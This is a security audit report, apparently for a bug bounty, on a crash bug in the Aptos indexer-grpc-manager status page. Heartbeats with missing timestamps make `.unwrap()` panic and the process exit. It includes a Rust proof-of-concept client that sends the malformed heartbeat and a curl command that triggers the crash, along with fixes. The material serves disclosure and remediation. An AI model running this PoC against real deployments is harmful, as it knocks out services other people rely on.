# Audit Report

## Title
Denial of Service via Panic on Missing Timestamp Fields in Status Page Rendering

## Summary
The `status_page.rs` file contains multiple `.unwrap()` calls on optional protobuf `timestamp` fields that can cause the indexer-grpc-manager process to crash when rendering the status page with maliciously crafted or incomplete heartbeat data.

## Finding Description

The indexer-grpc-manager service accepts heartbeat messages from external services (fullnodes, data services) via its gRPC `Heartbeat` endpoint. These messages contain `FullnodeInfo`, `LiveDataServiceInfo`, and `HistoricalDataServiceInfo` protobuf structures where the `timestamp` field is defined as optional. [1](#0-0) 

The heartbeat handler stores these info structures without validating that the `timestamp` field is present: [2](#0-1) 

When the HTTP status page endpoint is accessed, it attempts to render this data using `.unwrap()` on the optional timestamp fields, which will panic if the timestamp is `None`: [3](#0-2) [4](#0-3) [5](#0-4) 

Additional vulnerable unwrap calls exist at: [6](#0-5) [7](#0-6) 

The global panic handler terminates the entire process when any panic occurs: [8](#0-7) 

**Attack Path:**
1. Attacker sends a gRPC `HeartbeatRequest` to the publicly accessible endpoint with a protobuf message where `timestamp` is omitted (None)
2. The service stores this malformed data without validation
3. When any user accesses the status page HTTP endpoint, the rendering code calls `.unwrap()` on the None timestamp
4. The panic propagates to the global panic handler which calls `process::exit(12)`
5. The entire indexer-grpc-manager service crashes and must be restarted

## Impact Explanation

This qualifies as **High Severity** according to Aptos bug bounty criteria, which explicitly lists "API crashes" under High severity impacts. The vulnerability causes complete termination of the indexer-grpc-manager process, not just a failed request. While this doesn't affect core blockchain consensus or fund security, it disrupts critical indexer infrastructure that applications rely on for querying blockchain data.

However, the security question itself labels this as "(Low)", suggesting it may be considered non-critical infrastructure from a blockchain security perspective.

## Likelihood Explanation

**High Likelihood:**
- The gRPC heartbeat endpoint has no authentication requirements
- Crafting a protobuf message with an omitted optional field is trivial
- The status page endpoint is publicly accessible for monitoring purposes
- The attack can be repeatedly executed to cause persistent DoS
- No special privileges or insider access required

## Recommendation

Replace all `.unwrap()` calls on optional timestamp fields with safe alternatives:

**Option 1: Use `.unwrap_or_default()`**
```rust
format!("{:?}", last_sample.timestamp.unwrap_or_default())
```

**Option 2: Handle None case explicitly**
```rust
let timestamp = if let Some(ts) = last_sample.timestamp {
    format!("{:?}", ts)
} else {
    "No timestamp".to_string()
};
```

**Option 3: Add validation in heartbeat handler**
Reject heartbeat messages that lack required fields before storing them.

## Proof of Concept

**Rust PoC - Malicious Client:**

```rust
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info, FullnodeInfo, HeartbeatRequest, ServiceInfo,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = GrpcManagerClient::connect("http://[manager-address]:8084").await?;
    
    // Craft malicious FullnodeInfo with timestamp: None
    let malicious_info = FullnodeInfo {
        chain_id: 1,
        timestamp: None,  // This will cause panic on status page render
        known_latest_version: Some(1000),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker:8080".to_string()),
            info: Some(Info::FullnodeInfo(malicious_info)),
        }),
    };
    
    // Send malicious heartbeat
    client.heartbeat(request).await?;
    
    println!("Malicious heartbeat sent. Access the status page to trigger panic.");
    Ok(())
}
```

**Trigger the crash:**
```bash
curl http://[manager-address]:[health-port]/
# Process crashes with exit code 12
```

**Notes:**
- This vulnerability exists because Rust's `format!()` macro is type-safe and cannot have traditional format string injection vulnerabilities, but it can still panic on `.unwrap()` calls with unexpected None values
- The protobuf optional fields are correctly typed as `Option<T>` in Rust, but the rendering code assumes they are always present
- The same pattern is safely handled elsewhere in the codebase using `.unwrap_or_default()`, showing awareness of the issue

### Citations

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L51-55)
```text
message FullnodeInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-549)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L71-78)
```rust
                    let (timestamp, known_latest_version) = if let Some(last_sample) = last_sample {
                        (
                            format!("{:?}", last_sample.timestamp.unwrap()),
                            format!("{}", last_sample.known_latest_version()),
                        )
                    } else {
                        ("No data point.".to_string(), "No data point.".to_string())
                    };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L115-129)
```rust
            let (timestamp, known_latest_version, min_servable_version, num_connected_streams) =
                if let Some(last_sample) = last_sample {
                    (
                        format!("{:?}", last_sample.timestamp.unwrap()),
                        format!("{}", last_sample.known_latest_version()),
                        format!("{:?}", last_sample.min_servable_version),
                        format!(
                            "{}",
                            last_sample
                                .stream_info
                                .as_ref()
                                .map(|stream_info| stream_info.active_streams.len())
                                .unwrap_or_default()
                        ),
                    )
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L167-180)
```rust
            let (timestamp, known_latest_version, num_connected_streams) =
                if let Some(last_sample) = last_sample {
                    (
                        format!("{:?}", last_sample.timestamp.unwrap()),
                        format!("{}", last_sample.known_latest_version()),
                        format!(
                            "{}",
                            last_sample
                                .stream_info
                                .as_ref()
                                .map(|stream_info| stream_info.active_streams.len())
                                .unwrap_or_default()
                        ),
                    )
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L245-249)
```rust
                    (
                        data_service_instance,
                        sample.timestamp.unwrap(),
                        stream_info,
                    )
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L267-271)
```rust
                    (
                        data_service_instance,
                        sample.timestamp.unwrap(),
                        stream_info,
                    )
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L156-168)
```rust
fn handle_panic(panic_info: &PanicHookInfo<'_>) {
    // The Display formatter for a PanicHookInfo contains the message, payload and location.
    let details = format!("{}", panic_info);
    let backtrace = format!("{:#?}", Backtrace::new());
    let info = CrashInfo { details, backtrace };
    let crash_info = toml::to_string_pretty(&info).unwrap();
    error!("{}", crash_info);
    // TODO / HACK ALARM: Write crash info synchronously via eprintln! to ensure it is written before the process exits which error! doesn't guarantee.
    // This is a workaround until https://github.com/aptos-labs/aptos-core/issues/2038 is resolved.
    eprintln!("{}", crash_info);
    // Kill the process
    process::exit(12);
}
```
